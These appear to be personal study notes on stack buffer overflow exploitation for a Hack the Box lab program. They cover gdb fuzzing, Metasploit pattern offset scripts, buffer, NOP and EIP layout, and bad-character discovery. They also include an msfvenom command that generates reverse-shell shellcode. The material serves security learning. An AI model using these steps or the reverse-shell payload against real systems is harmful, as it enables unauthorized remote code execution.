# Binary Exploitation QuickNotes

## Notes
- Vulnerable functions include strcpy, gets, sprintf, scanf, strcat.
- To inspect assembly of a program in gdb use `disassemble main`
- Test for buffer overflows by using `run $(python -c "print '\x55' * 1200")` within gdb
- Offsets can be determined by generating a pattern then sending it to the program via gdb in conjunction with the metasploit script  used like so `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt`. After which you will need to copy and paste or feed the data into the program via the `run` command seen in the last step.
- A memory address will be shown in gdb after the segmentation fault, this will be fed into the pattern offset metasploit script like so `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569`, this will produce the exact offset location which will allow for stack based attacks.
- To find exact memory addressess use `info registers <your-register>` ebp is the beginning of the stack, eip is what we seek to execute code by pointing to a new memory register.
- Next onto generating shellcode via metasploit: `msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c` by default this will be some small amount of memory, however 
- In order for this code to execute we will need to calculate exactly where to put it into the buffer, it is preferable to put it at the end of the buffer and then overwrite the eip which will store our code safely, better to have more than less so we over guess how many bytes the shellcode will take up in memory.
- If a buffer of 1036 bytes existed, we could use the following to create a memory allocation system for the shellcode, NOPs are just used to make sure the shellcode executes cleanly.
```
   Buffer = "\x55" * (1040 - 100 - 150 - 4) = 786
     NOPs = "\x90" * 100
Shellcode = "\x44" * 150
      EIP = "\x66" * 4
```
- C programs inherently use reserved characters that may make the payload useless if they are used in the shellcode or as nops or in the buffer. To discover these special characters gdb must be run with a breakpoint in the vulnerable function after which we can use a payload to find non-interpuratable characters.
- First locate the function name inside of gdb using `disas main` it should be enclosed in arrow brackets \<vulnfunc\>
- Then set the breakpoint using the funciton name like so `break vulnfunc`
- Once the breakpoint is set, the program will stop executing and we can use `run $(python -c 'print "\x55" * (1040 - 256 - 4) + "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" + "\x66" * 4')` to print every known character to the buffer and by finding out what characters were not found in order ignored characters can be found.

## Register Cheatsheet

### Data
32-bit Register	64-bit Register	Description
EAX	RAX	Accumulator is used in input/output and for arithmetic operations
EBX	RBX	Base is used in indexed addressing
ECX	RCX	Counter is used to rotate instructions and count loops
EDX	RDX	Data is used for I/O and in arithmetic operations for multiply and divide operations involving large values
### Pointer
32-bit Register	64-bit Register	Description
EIP	RIP	Instruction Pointer stores the offset address of the next instruction to be executed
ESP	RSP	Stack Pointer points to the top of the stack
EBP	RBP	Base Pointer is also known as Stack Base Pointer or Frame Pointer thats points to the base of the stack

## Programs
### Bow.c
Courtisy of Hack the Box, uses a single function to copy a string from a single function to a character buffer. Only works with address space layout randomization turned off. So effectively useless on in production/modern systems ( post 80s )



